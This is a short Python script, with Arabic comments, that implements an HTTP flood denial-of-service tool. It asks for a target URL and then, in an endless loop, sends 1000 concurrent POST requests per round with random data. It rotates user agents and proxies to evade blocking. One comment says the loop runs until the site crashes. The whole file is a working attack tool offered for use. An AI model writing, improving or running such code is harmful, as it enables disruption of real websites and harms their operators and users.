import aiohttp
import asyncio
import random
import string

async def send_request(session, url, proxy):
    try:
        # إعدادات البروكسي
        proxy_url = f"http://{proxy}" if proxy else None
        # إضافة بيانات عشوائية إلى الطلب
        data = generate_random_data()
        async with session.post(url, data=data, headers={'User-Agent': generate_user_agent()}, proxy=proxy_url) as response:
            print("Request sent:", response.status)
            await asyncio.sleep(0.1)  # توزيع الطلبات بين الاستجابات
    except Exception as e:
        print("Error:", e)

def generate_user_agent():
    user_agents = load_file('user_agents.txt')
    return random.choice(user_agents)

def generate_random_data(length=100):
    # توليد بيانات عشوائية للطلب
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for _ in range(length)).encode()

def load_file(file_path):
    try:
        with open(file_path, 'r') as file:
            lines = file.read().splitlines()
        return lines
    except FileNotFoundError:
        print(f"No file found at {file_path}")
        return []

async def main():
    target_url = input("Enter the target URL: ")

    proxies = load_file('proxies.txt')

    async with aiohttp.ClientSession() as session:
        while True:  # حلقة لا نهائية لمواصلة الهجوم حتى يتعطل الموقع
            tasks = []
            for _ in range(1000):  # زيادة عدد الطلبات المرسلة في كل دورة
                proxy = random.choice(proxies) if proxies else None
                task = send_request(session, target_url, proxy)
                tasks.append(task)
            await asyncio.gather(*tasks)

asyncio.run(main())
